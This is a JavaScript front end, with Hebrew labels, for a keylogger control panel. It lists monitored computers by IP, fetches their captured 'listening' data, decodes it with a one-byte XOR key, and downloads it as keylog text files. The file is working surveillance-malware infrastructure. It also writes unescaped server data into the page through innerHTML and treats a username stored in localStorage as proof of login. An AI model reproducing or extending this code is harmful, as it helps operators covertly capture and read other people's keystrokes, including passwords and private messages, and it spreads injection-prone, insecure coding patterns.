const API_URL = 'http://localhost:5000/api';

let computers = [];
document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');
    const loginPage = document.getElementById('login-page');
    const dashboardPage = document.getElementById('dashboard-page');
    const userNameElement = document.getElementById('user-name');
    const searchInput = document.getElementById('search-input');
    
    // Check if user is already logged in
    const username = localStorage.getItem('username');
    if (username) {
        loginPage.style.display = 'none';
        dashboardPage.style.display = 'block';
        userNameElement.innerText = username;
        updateComputersList();
    }

    // Add login form event listener
    if (loginForm) {
        loginForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
        
            try {
                const response = await fetch(`${API_URL}/login`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        username,
                        password
                    })
                });
                const data = await response.json();
                if (data.success) {
                    localStorage.setItem('username', data.username);
                    loginPage.style.display = 'none';
                    dashboardPage.style.display = 'block';
                    userNameElement.innerText = data.username;
                    updateComputersList();
                } else {
                    alert("שם משתמש או סיסמה שגויים");
                }
            } catch (error) {
                console.error("שגיאת התחברות", error);
                alert("שגיאת התחברות");
            }
        });
    }

    // Add search functionality
    if (searchInput) {
        searchInput.addEventListener('input', searchComputers);
    }
});

// Show/hide add computer form
function showAddComputerForm() {
    const form = document.getElementById('add-computer-form');
    form.style.display = form.style.display === 'none' ? 'block' : 'none';
}

// Add computer function
async function addComputer() {
    const name = document.getElementById('name').value;
    const ip = document.getElementById('ip').value;
    
    if (!name || !ip) {
        alert("נא למלא את כל השדות");
        return;
    }
    
    try {
        const response = await fetch(`${API_URL}/computers`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                name,
                ip
            })
        });

        const data = await response.json();
        if (!response.ok) {
            alert(data.message || "שגיאה בהוספת מחשב");
            return;
        }
        
        // Hide form and clear inputs
        document.getElementById('add-computer-form').style.display = 'none';
        document.getElementById('name').value = '';
        document.getElementById('ip').value = '';
        
        // Refresh computers list
        updateComputersList();
        
    } catch (error) {
        console.error("שגיאה בהוספת מחשב", error);
        alert("שגיאה בהוספת מחשב");
    }
}

// Remove computer function
async function removeComputer(ip) {
    if (!confirm("האם אתה בטוח שברצונך למחוק את המחשב?")) {
        return;
    }
    
    try {
        const response = await fetch(`${API_URL}/computers/${ip}`, {
            method: 'DELETE'
        });

        if (!response.ok) {
            alert("שגיאה במחיקת מחשב");
            return;
        }
        
        await response.json();
        updateComputersList();
        
    } catch (error) {
        console.error("שגיאה במחיקת מחשב", error);
        alert("שגיאה במחיקת מחשב");
    }
}

// Update computers list
async function updateComputersList() {
    try {
        const response = await fetch(`${API_URL}/computers`);
        if (!response.ok) {
            throw new Error('שגיאה בטעינת רשימת מחשבים');
        }
        
        computers = await response.json();
        renderComputersList(computers);
        
    } catch (error) {
        console.error("שגיאה בטעינת רשימת מחשבים", error);
    }
}

// Render computers list
function renderComputersList(computersList) {
    const tableBody = document.getElementById('computers-list');
    if (!tableBody) return;
    
    tableBody.innerHTML = '';

    computersList.forEach(computer => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${computer.name}</td>
            <td>${computer.ip}</td>
            <td>${computer.status || 'offline'}</td>
            <td>${computer.lastActivity || 'לא ידוע'}</td>
            <td>
                <button onclick="removeComputer('${computer.ip}')">מחק</button>
                <button onclick="showMonitoring('${computer.ip}')">מעקב</button>
                <button onclick="showListeningData('${computer.ip}')" ${!computer.data ? 'disabled' : ''}>צפה בהאזנות</button>
            </td>
        `;
        tableBody.appendChild(tr);
    });
}

// Show monitoring page
async function showMonitoring(ip) {
    try {
        const response = await fetch(`${API_URL}/computers/${ip}`);
        if (!response.ok) {
            throw new Error('שגיאה בטעינת פרטי מחשב');
        }
        
        const computer = await response.json();
        
        const dashboardContent = document.getElementById('dashboard-content');
        dashboardContent.innerHTML = `
            <div class="computer-details">
                <h2>פרטי מחשב: ${computer.name}</h2>
                <div class="details-container">
                    <p><strong>IP:</strong> ${computer.ip}</p>
                    <p><strong>סטטוס:</strong> ${computer.status || 'offline'}</p>
                    <p><strong>פעילות אחרונה:</strong> ${computer.lastActivity || 'לא ידוע'}</p>
                    <p><strong>נתוני האזנה:</strong> ${computer.data ? 'זמינים' : 'לא זמינים'}</p>
                    ${computer.data ? `<p><strong>עדכון אחרון:</strong> ${computer.last_modified}</p>` : ''}
                </div>
                
                <div class="actions-container">
                    <button onclick="updateComputersList()">חזרה לרשימה</button>
                    ${computer.data ? 
                        `<button onclick="showListeningData('${computer.ip}')">צפה בנתוני האזנה</button>
                        <button onclick="downloadListeningData('${computer.ip}')">הורד קובץ האזנה</button>` : 
                        ''}
                </div>
            </div>
        `;
    } catch (error) {
        console.error("שגיאה בטעינת פרטי מחשב", error);
        alert("שגיאה בטעינת פרטי מחשב");
    }
}

// Show listening data page
async function showListeningData(ip) {
    try {
        const response = await fetch(`${API_URL}/listening/${ip}`);
        if (!response.ok) {
            throw new Error('שגיאה בטעינת נתוני האזנה');
        }
        
        const data = await response.json();
        
        const computer = computers.find(computer => computer.ip === ip);
        const computerName = computer ? computer.name : 'לא ידוע';

        const dashboardContent = document.getElementById('dashboard-content');
        
        // Format the data as a readable report
        let contentHTML = '<div class="listening-records">';
        
        if (Array.isArray(data)) {
            // Array of records
            for (const record of data) {
                contentHTML += formatListeningRecord(record);
            }
        } else {
            // Object with timestamps as keys
            for (const timestamp in data) {
                contentHTML += `<div class="timestamp-header">${timestamp}</div>`;
                contentHTML += formatListeningRecord(data[timestamp]);
            }
        }
        
        contentHTML += '</div>';

        dashboardContent.innerHTML = `
            <div class="listening-data">
                <h2>נתוני האזנה של מחשב: ${computerName}</h2>
                <div class="data-actions">
                    <button onclick="updateComputersList()">חזרה לרשימה</button>
                    <button onclick="showMonitoring('${ip}')">חזרה לפרטי מחשב</button>
                    <button onclick="downloadDecodedData('${ip}')">הורד נתונים מפוענחים</button>
                </div>
                <div class="data-content">
                    ${contentHTML}
                </div>
            </div>
        `;
    } catch (error) {
        console.error("שגיאה בטעינת נתוני האזנה:", error);
        alert("שגיאה בטעינת נתוני האזנה");
    }
}

// Format listening record
function formatListeningRecord(record) {
    if (Array.isArray(record)) {
        // Try to decrypt the encrypted data and display it in a readable form
        try {
            const decrypted = record.map(char => decryptData(char)).join('');
            return `<div class="listening-entry">
                <div class="raw-data" style="display:none">${JSON.stringify(record)}</div>
                <div class="decrypted-data">${decrypted}</div>
            </div>`;
        } catch (e) {
            return `<div class="listening-entry error">שגיאה בפענוח: ${e.message}</div>`;
        }
    } else if (typeof record === 'object') {
        let html = '<div class="listening-entry">';
        for (const key in record) {
            html += `<div><strong>${key}:</strong> ${JSON.stringify(record[key])}</div>`;
        }
        html += '</div>';
        return html;
    } else {
        return `<div class="listening-entry">${record}</div>`;
    }
}

// Decrypt data using XOR with key "F"
function decryptData(encryptedData, key = "F") {
    let decrypted = '';
    for(let i = 0; i < encryptedData.length; i++) {
        const charCode = encryptedData.charCodeAt(i) ^ key.charCodeAt(0);
        decrypted += String.fromCharCode(charCode % 256);
    }
    return decrypted;
}

// Download decoded data
async function downloadDecodedData(ip) {
    try {
        const response = await fetch(`${API_URL}/listening/${ip}`);
        if (!response.ok) {
            throw new Error('שגיאה בטעינת נתוני האזנה');
        }
        
        const data = await response.json();
        
        // Convert the data to decoded text
        let decodedText = '';
        
        if (Array.isArray(data)) {
            for (const record of data) {
                decodedText += processRecordForDownload(record) + '\n\n';
            }
        } else {
            for (const timestamp in data) {
                decodedText += `=== ${timestamp} ===\n`;
                decodedText += processRecordForDownload(data[timestamp]) + '\n\n';
            }
        }
        
        // Create download file
        const blob = new Blob([decodedText], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `keylog_${ip}_decoded.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    } catch (error) {
        console.error("שגיאה בהורדת נתונים:", error);
        alert("שגיאה בהורדת נתונים");
    }
}

// Process record for download
function processRecordForDownload(record) {
    if (Array.isArray(record)) {
        return record.map(char => decryptData(char)).join('');
    } else if (typeof record === 'object') {
        let text = '';
        for (const key in record) {
            text += `${key}: ${JSON.stringify(record[key])}\n`;
        }
        return text;
    } else {
        return String(record);
    }
}

// Search computers
function searchComputers() {
    const searchValue = document.getElementById('search-input').value.toLowerCase();
    const filteredComputers = computers.filter(computer => {
        return computer.name.toLowerCase().includes(searchValue) || 
               computer.ip.toLowerCase().includes(searchValue);
    });

    renderComputersList(filteredComputers);
}

// Show different pages
function showPage(pageName) {
    const dashboardContent = document.getElementById('dashboard-content');
    
    switch(pageName) {
        case 'dashboard':
            updateComputersList();
            break;
        case 'users':
            dashboardContent.innerHTML = '<h2>ניהול משתמשים</h2><p>פונקציונליות זו עדיין בפיתוח</p>';
            break;
        default:
            updateComputersList();
    }
}

// Logout function
function logout() {
    localStorage.removeItem('username');
    document.getElementById('login-page').style.display = 'block';
    document.getElementById('dashboard-page').style.display = 'none';
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
}